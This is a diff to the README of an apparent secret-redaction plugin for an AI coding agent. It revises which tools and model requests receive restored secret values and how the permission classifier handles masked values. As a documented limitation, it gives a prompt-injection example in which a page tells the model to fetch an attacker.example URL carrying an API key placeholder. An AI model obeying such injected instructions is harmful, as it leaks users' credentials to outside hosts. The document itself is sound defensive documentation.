@@ -14,7 +14,6 @@ Swaps what your rules match for numbered placeholders before the model sees it, 
 **Does not protect against**
 
 - Real values leaving through a tool. Every tool gets them, WebFetch, WebSearch and MCP tools included, so a prompt injection or a placeholder echoed into a command sends the value out. See [What gets the real values](#what-gets-the-real-values).
-- Model requests made after the restore: the permission check (in auto mode its classifier is a model), WebSearch's query, WebFetch's prompt to the model that reads the page.
 - Anything at all until you turn a rule on or add one.
 - Values no rule matches: an unusual format, an encoded or split value, one sent before a rule matched it.
 - Images and documents, personal data other than emails, and other hooks, plugins or telemetry that see tool input.
@@ -44,12 +43,11 @@ Answer `y` to add the marketplace, then pick a scope.
 
 ## What gets the real values
 
-Every tool, remote ones included: WebFetch, WebSearch, MCP tools. The restore is silent on purpose: redact keeps secrets out of the model, not out of your tools, so a command that needs a key gets it without a prompt. That has a price:
+Every tool, remote ones included: WebFetch, WebSearch, MCP tools. Two fields keep their placeholders, as neither needs a real value: WebFetch's `prompt`, which goes to the model that reads the page, and WebSearch's `query`, which goes to the search provider. The restore is silent on purpose: redact keeps secrets out of the model, not out of your tools, so a command that needs a key gets it without a prompt. That has a price:
 
-- **A placeholder in an outgoing call sends the real value.** One the model echoes into `gh pr create --body`, a commit message or a WebSearch query goes out as the value itself. To send the placeholder text instead, escape it (`⟦!API_KEY_n⟧`, see [What it refuses](#what-it-refuses)).
+- **A placeholder in an outgoing call sends the real value.** One the model echoes into `gh pr create --body`, a commit message or a WebFetch URL goes out as the value itself. To send the placeholder text instead, escape it (`⟦!API_KEY_n⟧`, see [What it refuses](#what-it-refuses)).
 - **A prompt injection can send a value out.** A page or file that tells the model to fetch `https://attacker.example/?k=⟦API_KEY_n⟧` gets the real key sent there. The placeholder keeps a value from the model, not from the services the model calls.
-- **The permission check sees the real values**, as it runs after the restore. In auto mode its classifier is a model request.
-- **A tool's own model request**, where it makes one (WebSearch's query, WebFetch's prompt to the model that reads the page), carries the real value.
+- **The permission check sees the real values**, as it runs after the restore. On your machine that is no request, but in auto mode it asks a model, its classifier. So a call that carries a masked value skips the classifier and asks you, even in auto mode; with nobody to ask (a headless run) it is refused.
 
 ## Use
 
